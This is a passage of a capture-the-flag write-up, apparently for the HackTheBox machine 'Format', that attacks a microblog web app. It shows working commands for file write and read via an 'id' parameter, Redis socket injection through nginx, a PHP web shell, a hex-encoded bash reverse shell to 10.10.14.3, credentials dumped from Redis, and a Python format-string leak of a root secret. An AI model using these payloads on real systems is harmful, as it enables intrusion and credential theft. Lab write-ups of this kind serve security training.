</span></span><span style=display:flex><span>        <span style=color:#fb660a>$redis</span> = <span style=color:#fb660a;font-weight:700>new</span> Redis();
</span></span><span style=display:flex><span>        <span style=color:#fb660a>$redis</span>-&gt;<span style=color:#ff0086;font-weight:700>connect</span>(<span style=color:#0086d2>&#39;/var/run/redis/redis.sock&#39;</span>);
</span></span><span style=display:flex><span>        <span style=color:#fb660a>$pro</span> = <span style=color:#fb660a>$redis</span>-&gt;<span style=color:#ff0086;font-weight:700>HGET</span>(<span style=color:#fb660a>$_SESSION</span>[<span style=color:#0086d2>&#39;username&#39;</span>], <span style=color:#0086d2>&#34;pro&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>return</span> strval(<span style=color:#fb660a>$pro</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>return</span> <span style=color:#0086d2>&#34;false&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>A user is not explicitely being saved as Pro=false, basically if the user is not Pro, the value can even be NULL or not exists at all in the DB (?). Somehow I need to set my self Pro=true in that Redis service (redis.sock). I will come back to this later.</p><p>I&rsquo;ve found this function, where you can edit your site your microblog site: ./microblog-template/edit/index.php</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic>//add text
</span></span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic></span><span style=color:#fb660a;font-weight:700>if</span> (isset(<span style=color:#fb660a>$_POST</span>[<span style=color:#0086d2>&#39;txt&#39;</span>]) &amp;&amp; isset(<span style=color:#fb660a>$_POST</span>[<span style=color:#0086d2>&#39;id&#39;</span>])) {
</span></span><span style=display:flex><span>    chdir(getcwd() . <span style=color:#0086d2>&#34;/../content&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#fb660a>$txt_nl</span> = nl2br(<span style=color:#fb660a>$_POST</span>[<span style=color:#0086d2>&#39;txt&#39;</span>]);
</span></span><span style=display:flex><span>    <span style=color:#fb660a>$html</span> = <span style=color:#0086d2>&#34;&lt;div class = </span><span style=color:#0086d2>\&#34;</span><span style=color:#0086d2>blog-text</span><span style=color:#0086d2>\&#34;</span><span style=color:#0086d2>&gt;</span><span style=color:#0086d2>{</span><span style=color:#fb660a>$txt_nl</span><span style=color:#0086d2>}</span><span style=color:#0086d2>&lt;/div&gt;&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#fb660a>$post_file</span> = fopen(<span style=color:#0086d2>&#34;</span><span style=color:#0086d2>{</span><span style=color:#fb660a>$_POST</span>[<span style=color:#0086d2>&#39;id&#39;</span>]<span style=color:#0086d2>}</span><span style=color:#0086d2>&#34;</span>, <span style=color:#0086d2>&#34;w&#34;</span>);
</span></span><span style=display:flex><span>    fwrite(<span style=color:#fb660a>$post_file</span>, <span style=color:#fb660a>$html</span>);
</span></span><span style=display:flex><span>    fclose(<span style=color:#fb660a>$post_file</span>);
</span></span><span style=display:flex><span>    <span style=color:#fb660a>$order_file</span> = fopen(<span style=color:#0086d2>&#34;order.txt&#34;</span>, <span style=color:#0086d2>&#34;a&#34;</span>);
</span></span><span style=display:flex><span>    fwrite(<span style=color:#fb660a>$order_file</span>, <span style=color:#fb660a>$_POST</span>[<span style=color:#0086d2>&#39;id&#39;</span>] . <span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>&#34;</span>);  
</span></span><span style=display:flex><span>    fclose(<span style=color:#fb660a>$order_file</span>);
</span></span><span style=display:flex><span>    header(<span style=color:#0086d2>&#34;Location: /edit?message=Section added!&amp;status=success&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>You can realize that <code>$post_file</code> var loads the content of file <code>fopen("{$_POST['id']}", "w")</code>, we can just modify <code>id</code> parameter with whatever we want:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>curl -i -s -k -X <span style=color:#0086d2>$&#39;POST&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>       -H <span style=color:#0086d2>$&#39;Host: foo.microblog.htb&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>       -H <span style=color:#0086d2>$&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>       -b <span style=color:#0086d2>$&#39;username=t49mkkpc4a322f9hbhpfcehjp4&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>       --data-binary <span style=color:#0086d2>$&#39;id=../../../../../etc/passwd&amp;txt=no+mams+wey&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>       <span style=color:#0086d2>$&#39;http://foo.microblog.htb/edit/index.php&#39;</span>
</span></span></code></pre></div><p>And we will get an ugly long /etc/passwd text where we can identify users <code>cooper</code> and <code>git</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-text data-lang=text><span style=display:flex><span>root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologinsystemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologincooper:x:1000:1000::/home/cooper:/bin/bashredis:x:103:33::/var/lib/redis:/usr/sbin/nologingit:x:104:111:Git Version Control,,,:/home/git:/bin/bashmessagebus:x:105:112::/nonexistent:/usr/sbin/nologinsshd:x:106:65534::/run/sshd:/usr/sbin/nologin_laurel:x:997:997::/var/log/laurel:/bin/false
</span></span></code></pre></div><p>Let&rsquo;s read <code>/etc/nginx/sites-enabled/default</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-nginx data-lang=nginx><span style=display:flex><span><span style=color:#fb660a;font-weight:700>server</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#fb660a;font-weight:700>listen</span> <span style=color:#0086f7;font-weight:700>80</span>; <span style=color:#fb660a;font-weight:700>listen</span> <span style=color:#0086d2>[::]:80</span>; <span style=color:#fb660a;font-weight:700>root</span> <span style=color:#0086d2>/var/www/microblog/app</span>; <span style=color:#fb660a;font-weight:700>index</span> <span style=color:#0086d2>index.html</span> <span style=color:#0086d2>index.htm</span> <span style=color:#0086d2>index-nginx-debian.html</span>; <span style=color:#fb660a;font-weight:700>server_name</span> <span style=color:#0086d2>microblog.htb</span>; <span style=color:#fb660a;font-weight:700>location</span> <span style=color:#0086d2>/</span>
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		<span style=color:#fb660a;font-weight:700>return</span> <span style=color:#0086f7;font-weight:700>404</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#fb660a;font-weight:700>location</span> = <span style=color:#0086d2>/static/css/health/</span>
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		<span style=color:#fb660a;font-weight:700>resolver</span> <span style=color:#0086f7;font-weight:700>127</span><span style=color:#0086d2>.0.0.1</span>; <span style=color:#fb660a;font-weight:700>proxy_pass</span> <span style=color:#0086d2>http://css.microbucket.htb/health.txt</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#fb660a;font-weight:700>location</span> = <span style=color:#0086d2>/static/js/health/</span>
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		<span style=color:#fb660a;font-weight:700>resolver</span> <span style=color:#0086f7;font-weight:700>127</span><span style=color:#0086d2>.0.0.1</span>; <span style=color:#fb660a;font-weight:700>proxy_pass</span> <span style=color:#0086d2>http://js.microbucket.htb/health.txt</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#fb660a;font-weight:700>location</span> ~ <span style=color:#0086d2>/static/(.*)/(.*)</span>
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		<span style=color:#fb660a;font-weight:700>resolver</span> <span style=color:#0086f7;font-weight:700>127</span><span style=color:#0086d2>.0.0.1</span>; <span style=color:#fb660a;font-weight:700>proxy_pass</span> <span style=color:#0086d2>http://</span><span style=color:#fb660a>$1.microbucket.htb/$2</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>That <code>/static/(.*)/(.*)</code> seems vulnerable to path traversal vulnerability. Thanks to curl we can write to that redis socket: <code>curl -X HSET "http://microblog.htb/static/unix:%2Fvar%2Frun%2Fredis%2Fredis.sock:foo%20pro%20true%20a/uri"</code>
And we are Pro now.</p><p>Now we are able to upload images to folder:
<a href=http://foo.microblog.htb/uploads/64de8036164f10.17787109_ghmnjlkopiefq.png>http://foo.microblog.htb/uploads/64de8036164f10.17787109_ghmnjlkopiefq.png</a>
<code>/uploads/</code></p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>curl -i -s -k -X <span style=color:#0086d2>$&#39;POST&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>...
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>    -b <span style=color:#0086d2>$&#39;username=t49mkkpc4a322f9hbhpfcehjp4&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>    --data-binary <span style=color:#0086d2>$&#39;id=/var/www/microblog/foo/uploads/z.php&amp;txt=&lt;?php if(isset($_REQUEST[\&#39;cmd\&#39;])){ echo \&#34;&lt;pre&gt;\&#34;; $cmd = ($_REQUEST[\&#39;cmd\&#39;]); system($cmd); echo \&#34;&lt;/pre&gt;\&#34;; die; }?&gt;&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>    <span style=color:#0086d2>$&#39;http://foo.microblog.htb/edit/index.php&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># Testing the PHP script</span>
</span></span><span style=display:flex><span>~z➤ curl -s <span style=color:#0086d2>&#39;http://foo.microblog.htb/uploads/z.php?cmd=id&#39;</span> | elinks --dump
</span></span><span style=display:flex><span> <span style=color:#fb660a>uid</span>=33(www-data) <span style=color:#fb660a>gid</span>=33(www-data) <span style=color:#fb660a>groups</span>=33(www-data)
</span></span></code></pre></div><p>Ok, let&rsquo;s change the z.php file content: <code>&lt;?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.3/55555 0>&amp;1'");?></code></p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#fb660a>id</span>=/var/www/microblog/foo/uploads/z.php&amp;<span style=color:#fb660a>txt</span>=%3c%3f%70%68%70%20%65%78%65%63%28%22%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%33%2f%35%35%35%35%35%20%30%3e%26%31%27%22%29%3b%3f%3e
</span></span></code></pre></div><p>And now we have a nice rev shell:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z➤ nc -lvnp <span style=color:#0086f7;font-weight:700>55555</span>
</span></span><span style=display:flex><span>Connection from 10.10.11.213:36906
</span></span><span style=display:flex><span>bash: cannot set terminal process group (619): Inappropriate ioctl <span style=color:#fb660a;font-weight:700>for</span> device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>www-data@format:~/microblog/foo/uploads$ pwd
</span></span><span style=display:flex><span>pwdid
</span></span><span style=display:flex><span>/var/www/microblog/foo/uploads
</span></span><span style=display:flex><span>www-data@format:~/microblog/foo/uploads$
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=33(www-data) <span style=color:#fb660a>gid</span>=33(www-data) <span style=color:#fb660a>groups</span>=33(www-data)
</span></span></code></pre></div><p>Exploring redis:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>www-data@format:~/microblog/foo/uploads$ redis-cli -s /var/run/redis/redis.sock
</span></span><span style=display:flex><span>&lt;foo/uploads$ redis-cli -s /var/run/redis/redis.sock
</span></span><span style=display:flex><span>&gt; keys *
</span></span><span style=display:flex><span>cooper.dooper
</span></span><span style=display:flex><span>cooper.dooper:sites
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&gt; hgetall cooper.dooper
</span></span><span style=display:flex><span>username
</span></span><span style=display:flex><span>cooper.dooper
</span></span><span style=display:flex><span>password
</span></span><span style=display:flex><span>zooperdoopercooper
</span></span><span style=display:flex><span>first-name
</span></span><span style=display:flex><span>Cooper
</span></span><span style=display:flex><span>last-name
</span></span><span style=display:flex><span>Dooper
</span></span><span style=display:flex><span>pro
</span></span><span style=display:flex><span>false
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># Now we are in</span>
</span></span><span style=display:flex><span>z➤ ssh cooper@microblog.htb
</span></span><span style=display:flex><span>cooper@format:~$ id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1000(cooper) <span style=color:#fb660a>gid</span>=1000(cooper) <span style=color:#fb660a>groups</span>=1000(cooper)
</span></span><span style=display:flex><span>cooper@format:~$ ls
</span></span><span style=display:flex><span>user.txt
</span></span></code></pre></div><h2 id=root-flag>Root Flag
<a class=heading-link href=#root-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>We have sudo for <code>/usr/bin/license</code>!</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>cooper@format:~$ sudo -l
</span></span><span style=display:flex><span>[sudo] password <span style=color:#fb660a;font-weight:700>for</span> cooper:
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#fb660a;font-weight:700>for</span> cooper on format:
</span></span><span style=display:flex><span>    env_reset, mail_badpass, <span style=color:#fb660a>secure_path</span>=/usr/local/sbin<span style=color:#0086d2>\:</span>/usr/local/bin<span style=color:#0086d2>\:</span>/usr/sbin<span style=color:#0086d2>\:</span>/usr/bin<span style=color:#0086d2>\:</span>/sbin<span style=color:#0086d2>\:</span>/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User cooper may run the following commands on format:
</span></span><span style=display:flex><span>    (root) /usr/bin/license
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cooper@format:~$ sudo /usr/bin/license -h
</span></span><span style=display:flex><span>usage: license [-h] (-p username | -d username | -c license_key)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Microblog license key manager
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>optional arguments:
</span></span><span style=display:flex><span>  -h, --help            show this help message and exit
</span></span><span style=display:flex><span>  -p username, --provision username
</span></span><span style=display:flex><span>                        Provision license key <span style=color:#fb660a;font-weight:700>for</span> specified user
</span></span><span style=display:flex><span>  -d username, --deprovision username
</span></span><span style=display:flex><span>                        Deprovision license key <span style=color:#fb660a;font-weight:700>for</span> specified user
</span></span><span style=display:flex><span>  -c license_key, --check license_key
</span></span><span style=display:flex><span>                        Check <span style=color:#fb660a;font-weight:700>if</span> specified license key is valid
</span></span></code></pre></div><p>That <code>license</code> is a py script:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>cooper@format:~$ cat /usr/bin/license
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic>#!/usr/bin/python3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>import</span> base64
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>from</span> cryptography.hazmat.backends <span style=color:#fb660a;font-weight:700>import</span> default_backend
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>from</span> cryptography.hazmat.primitives <span style=color:#fb660a;font-weight:700>import</span> hashes
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>from</span> cryptography.hazmat.primitives.kdf.pbkdf2 <span style=color:#fb660a;font-weight:700>import</span> PBKDF2HMAC
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>from</span> cryptography.fernet <span style=color:#fb660a;font-weight:700>import</span> Fernet
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>import</span> random
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>import</span> string
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>from</span> datetime <span style=color:#fb660a;font-weight:700>import</span> date
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>import</span> redis
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>import</span> argparse
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>import</span> os
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>import</span> sys
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>class</span> License():
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>def</span> __init__(self):
</span></span><span style=display:flex><span>        chars = string.ascii_letters + string.digits + string.punctuation
</span></span><span style=display:flex><span>        self.license = <span style=color:#0086d2>&#39;&#39;</span>.join(random.choice(chars) <span style=color:#fb660a;font-weight:700>for</span> i in range(<span style=color:#0086f7;font-weight:700>40</span>))
</span></span><span style=display:flex><span>        self.created = date.today()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>if</span> os.geteuid() != <span style=color:#0086f7;font-weight:700>0</span>:
</span></span><span style=display:flex><span>    print(<span style=color:#0086d2>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#0086d2>&#34;Microblog license key manager can only be run as root&#34;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#0086d2>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    sys.exit()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>parser = argparse.ArgumentParser(description=<span style=color:#0086d2>&#39;Microblog license key manager&#39;</span>)
</span></span><span style=display:flex><span>group = parser.add_mutually_exclusive_group(required=<span style=color:#fb660a;font-weight:700>True</span>)
</span></span><span style=display:flex><span>group.add_argument(<span style=color:#0086d2>&#39;-p&#39;</span>, <span style=color:#0086d2>&#39;--provision&#39;</span>, help=<span style=color:#0086d2>&#39;Provision license key for specified user&#39;</span>, metavar=<span style=color:#0086d2>&#39;username&#39;</span>)
</span></span><span style=display:flex><span>group.add_argument(<span style=color:#0086d2>&#39;-d&#39;</span>, <span style=color:#0086d2>&#39;--deprovision&#39;</span>, help=<span style=color:#0086d2>&#39;Deprovision license key for specified user&#39;</span>, metavar=<span style=color:#0086d2>&#39;username&#39;</span>)
</span></span><span style=display:flex><span>group.add_argument(<span style=color:#0086d2>&#39;-c&#39;</span>, <span style=color:#0086d2>&#39;--check&#39;</span>, help=<span style=color:#0086d2>&#39;Check if specified license key is valid&#39;</span>, metavar=<span style=color:#0086d2>&#39;license_key&#39;</span>)
</span></span><span style=display:flex><span>args = parser.parse_args()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r = redis.Redis(unix_socket_path=<span style=color:#0086d2>&#39;/var/run/redis/redis.sock&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>secret = [line.strip() <span style=color:#fb660a;font-weight:700>for</span> line in open(<span style=color:#0086d2>&#34;/root/license/secret&#34;</span>)][<span style=color:#0086f7;font-weight:700>0</span>]
</span></span><span style=display:flex><span>secret_encoded = secret.encode()
</span></span><span style=display:flex><span>salt = <span style=color:#0086d2>b</span><span style=color:#0086d2>&#39;microblogsalt123&#39;</span>
</span></span><span style=display:flex><span>kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=<span style=color:#0086f7;font-weight:700>32</span>,salt=salt,iterations=<span style=color:#0086f7;font-weight:700>100000</span>,backend=default_backend())
</span></span><span style=display:flex><span>encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>f = Fernet(encryption_key)
</span></span><span style=display:flex><span>l = License()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic>#provision</span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>if</span>(args.provision):
</span></span><span style=display:flex><span>    user_profile = r.hgetall(args.provision)
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>if</span> not user_profile:
</span></span><span style=display:flex><span>        print(<span style=color:#0086d2>&#34;&#34;</span>)
</span></span><span style=display:flex><span>        print(<span style=color:#0086d2>&#34;User does not exist. Please provide valid username.&#34;</span>)
</span></span><span style=display:flex><span>        print(<span style=color:#0086d2>&#34;&#34;</span>)
</span></span><span style=display:flex><span>        sys.exit()
</span></span><span style=display:flex><span>    existing_keys = open(<span style=color:#0086d2>&#34;/root/license/keys&#34;</span>, <span style=color:#0086d2>&#34;r&#34;</span>)
</span></span><span style=display:flex><span>    all_keys = existing_keys.readlines()
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>for</span> user_key in all_keys:
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>if</span>(user_key.split(<span style=color:#0086d2>&#34;:&#34;</span>)[<span style=color:#0086f7;font-weight:700>0</span>] == args.provision):
</span></span><span style=display:flex><span>            print(<span style=color:#0086d2>&#34;&#34;</span>)
</span></span><span style=display:flex><span>            print(<span style=color:#0086d2>&#34;License key has already been provisioned for this user&#34;</span>)
</span></span><span style=display:flex><span>            print(<span style=color:#0086d2>&#34;&#34;</span>)
</span></span><span style=display:flex><span>            sys.exit()
</span></span><span style=display:flex><span>    prefix = <span style=color:#0086d2>&#34;microblog&#34;</span>
</span></span><span style=display:flex><span>    username = r.hget(args.provision, <span style=color:#0086d2>&#34;username&#34;</span>).decode()
</span></span><span style=display:flex><span>    firstlast = r.hget(args.provision, <span style=color:#0086d2>&#34;first-name&#34;</span>).decode() + r.hget(args.provision, <span style=color:#0086d2>&#34;last-name&#34;</span>).decode()
</span></span><span style=display:flex><span>    license_key = (prefix + username + <span style=color:#0086d2>&#34;</span><span style=color:#0086d2>{license.license}</span><span style=color:#0086d2>&#34;</span> + firstlast).format(license=l)
</span></span><span style=display:flex><span>    print(<span style=color:#0086d2>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#0086d2>&#34;Plaintext license key:&#34;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#0086d2>&#34;------------------------------------------------------&#34;</span>)
</span></span><span style=display:flex><span>    print(license_key)
</span></span><span style=display:flex><span>    print(<span style=color:#0086d2>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    license_key_encoded = license_key.encode()
</span></span><span style=display:flex><span>    license_key_encrypted = f.encrypt(license_key_encoded)
</span></span><span style=display:flex><span>    print(<span style=color:#0086d2>&#34;Encrypted license key (distribute to customer):&#34;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#0086d2>&#34;------------------------------------------------------&#34;</span>)
</span></span><span style=display:flex><span>    print(license_key_encrypted.decode())
</span></span><span style=display:flex><span>    print(<span style=color:#0086d2>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>with</span> open(<span style=color:#0086d2>&#34;/root/license/keys&#34;</span>, <span style=color:#0086d2>&#34;a&#34;</span>) <span style=color:#fb660a;font-weight:700>as</span> license_keys_file:
</span></span><span style=display:flex><span>        license_keys_file.write(args.provision + <span style=color:#0086d2>&#34;:&#34;</span> + license_key_encrypted.decode() + <span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic>#deprovision</span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>if</span>(args.deprovision):
</span></span><span style=display:flex><span>    print(<span style=color:#0086d2>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#0086d2>&#34;License key deprovisioning coming soon&#34;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#0086d2>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    sys.exit()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic>#check</span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>if</span>(args.check):
</span></span><span style=display:flex><span>    print(<span style=color:#0086d2>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>try</span>:
</span></span><span style=display:flex><span>        license_key_decrypted = f.decrypt(args.check.encode())
</span></span><span style=display:flex><span>        print(<span style=color:#0086d2>&#34;License key valid! Decrypted value:&#34;</span>)
</span></span><span style=display:flex><span>        print(<span style=color:#0086d2>&#34;------------------------------------------------------&#34;</span>)
</span></span><span style=display:flex><span>        print(license_key_decrypted.decode())
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>except</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#0086d2>&#34;License key invalid&#34;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#0086d2>&#34;&#34;</span>)
</span></span></code></pre></div><p>So this script is reading data from Redis. Notice this:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>...
</span></span><span style=display:flex><span>    username = r.hget(args.provision, <span style=color:#0086d2>&#34;username&#34;</span>).decode()
</span></span><span style=display:flex><span>    firstlast = r.hget(args.provision, <span style=color:#0086d2>&#34;first-name&#34;</span>).decode() + r.hget(args.provision, <span style=color:#0086d2>&#34;last-name&#34;</span>).decode()
</span></span><span style=display:flex><span>    license_key = (prefix + username + <span style=color:#0086d2>&#34;</span><span style=color:#0086d2>{license.license}</span><span style=color:#0086d2>&#34;</span> + firstlast).format(license=l)
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>So what if we dump the secret value by modifying the first-name to <code>{license.__init__.__globals__[secret_encoded]}</code> in our existing site:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>cooper@format:~$ redis-cli -s /var/run/redis/redis.sock
</span></span><span style=display:flex><span>redis /var/run/redis/redis.sock&gt; HMSET foo first-name <span style=color:#0086d2>&#34;{license.__init__.__globals__[secret_encoded]}&#34;</span> last-name foo username foo
</span></span><span style=display:flex><span>OK
</span></span><span style=display:flex><span>redis /var/run/redis/redis.sock&gt; exit
</span></span></code></pre></div><p>Now let&rsquo;s try to check the license for our <code>foo</code> user:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>cooper@format:~$ sudo /usr/bin/license -p foo
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Plaintext license key:
</span></span><span style=display:flex><span>------------------------------------------------------
</span></span><span style=display:flex><span>microblogfooC&gt;ZZNBP)nzjMVI*eECtC,4_~_rh}(AgvM^f-_&lt;k}b<span style=color:#0086d2>&#39;unCR4ckaBL3Pa$$w0rd&#39;</span>foo
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Encrypted license key (distribute to customer):
</span></span><span style=display:flex><span>------------------------------------------------------
